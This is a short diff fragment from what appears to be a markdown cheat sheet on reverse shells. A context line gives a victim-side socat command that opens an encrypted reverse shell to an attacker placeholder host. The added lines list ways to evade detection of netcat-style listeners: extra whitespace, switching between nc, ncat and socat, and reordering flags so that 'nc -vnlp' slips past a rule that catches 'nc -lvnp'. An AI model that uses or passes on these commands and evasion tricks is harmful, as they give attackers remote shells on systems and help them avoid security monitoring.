@@ -98,4 +98,10 @@
 
 #### 4) Victim: socat OPENSSL:ATTACK_IP:4443,verify=0 EXEC:/bin/bash
 
+## 3rd Technique example
 
+#### 1) Add an extra white space (nc -)
+
+#### 2) Try nc/ncat/socat
+
+#### 3) Change the order of the flags (nc -lvnp TARGETED) (nc -vnlp EVADED) 
